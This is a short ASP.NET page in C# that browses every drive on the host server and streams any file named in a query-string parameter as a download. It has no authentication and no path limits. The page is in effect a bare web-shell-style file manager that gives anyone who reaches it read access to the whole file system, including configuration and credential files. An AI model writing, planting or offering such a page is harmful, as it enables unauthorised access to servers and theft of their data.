<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
void Page_Load(object s, EventArgs e) {
    if (Request.QueryString["a"] == "g") { Fetch(); return; }
    Response.Write(Browse());
}
void Fetch() {
    if (!File.Exists(Request.QueryString["f"])) { Response.Write("missing"); return; }
    Response.ContentType = "application/octet-stream";
    Response.TransmitFile(Request.QueryString["f"]);
    Response.End();
}
string Browse() {
    var sb = new System.Text.StringBuilder();
    foreach (DriveInfo d in DriveInfo.GetDrives()) sb.Append($"<a href='?p={d.Name}'>{d.Name}</a> ");
    string p = Request.QueryString["p"] ?? "C:\\";
    var di = new DirectoryInfo(p);
    foreach (var x in di.GetDirectories()) sb.Append($"<a href='?p={x.FullName}'>{x.Name}</a><br>");
    foreach (var x in di.GetFiles()) sb.Append($"<a href='?a=g&f={Server.UrlEncode(x.FullName)}'>{x.Name}</a><br>");
    return sb.ToString();
}
</script>
